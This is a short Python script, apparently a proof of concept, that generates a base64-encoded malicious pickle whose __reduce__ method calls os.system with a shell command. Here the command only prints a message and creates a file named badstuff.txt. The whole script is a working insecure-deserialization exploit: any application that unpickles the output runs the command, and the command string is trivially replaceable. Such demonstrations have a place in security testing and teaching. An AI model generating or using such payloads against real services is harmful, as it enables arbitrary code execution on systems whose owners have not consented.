import pickle
import sys
import base64

PYTHON_COMMAND = '''python -c 'print("bad stuff"); from pathlib import Path; Path("badstuff.txt").touch();' '''

class RCE(object):
    def __reduce__(self):
        import os
        return(os.system, (PYTHON_COMMAND,))

print(base64.b64encode(pickle.dumps(RCE())))
